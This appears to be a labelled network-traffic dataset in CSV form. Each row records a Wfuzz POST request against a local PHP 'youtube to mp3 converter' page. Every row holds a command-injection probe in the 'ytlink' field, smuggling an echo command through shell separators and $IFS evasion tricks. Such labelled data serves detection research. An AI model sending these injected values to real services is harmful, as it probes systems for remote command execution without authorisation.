attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,ytlink=%22||echo%20WMJGBT$((73%2B39))$(echo%20WMJGBT)WMJGBT%5C%5C&send=send,*/*,75,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61377
cmdinj,192.168.1.34,80,ytlink=%20echo%20THCQQN$((0%2B88))$(echo%20THCQQN)THCQQN%5C%5C&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61378
cmdinj,192.168.1.34,80,ytlink=&echo%20QSELIT$((42%2B46))$(echo%20QSELIT)QSELIT&&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61379
cmdinj,192.168.1.34,80,ytlink=%3Becho%20OKHPYH$((66%2B11))$(echo%20OKHPYH)OKHPYH%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61380
cmdinj,192.168.1.34,80,ytlink=%7Cecho%20VZDOKD$((12%2B24))$(echo%20VZDOKD)VZDOKD%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61382
cmdinj,192.168.1.34,80,ytlink=;echo$IFSORHOEA$((71%2B59))$(echo$IFSORHOEA)ORHOEA%26&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61383
cmdinj,192.168.1.34,80,"ytlink='%20echo%20DHXKNT$((83%2B17))$(echo%20DHXKNT)DHXKNT""&send=send",*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61384
cmdinj,192.168.1.34,80,ytlink='echo$IFSQUCSSY$((71%2B59))$(echo$IFSQUCSSY)QUCSSY%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61385
cmdinj,192.168.1.34,80,"ytlink=""echo$IFSGOPZNT$((61%2B76))$(echo$IFSGOPZNT)GOPZNT&&send=send",*/*,68,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61386
cmdinj,192.168.1.34,80,ytlink=echo$IFSSWOEAI$((89%2B70))$(echo$IFSSWOEAI)SWOEAI&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61387
cmdinj,192.168.1.34,80,ytlink=|echo$IFSMNCLPS$((56%2B63))$(echo$IFSMNCLPS)MNCLPS%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61388
cmdinj,192.168.1.34,80,"ytlink=%26%26echo$IFSAHYRFK$((59%2B15))$(echo$IFSAHYRFK)AHYRFK""&send=send",*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61389
cmdinj,192.168.1.34,80,ytlink=%7Cecho$IFSGUAVSF$((73%2B82))$(echo$IFSGUAVSF)GUAVSF%27&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:44 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61390
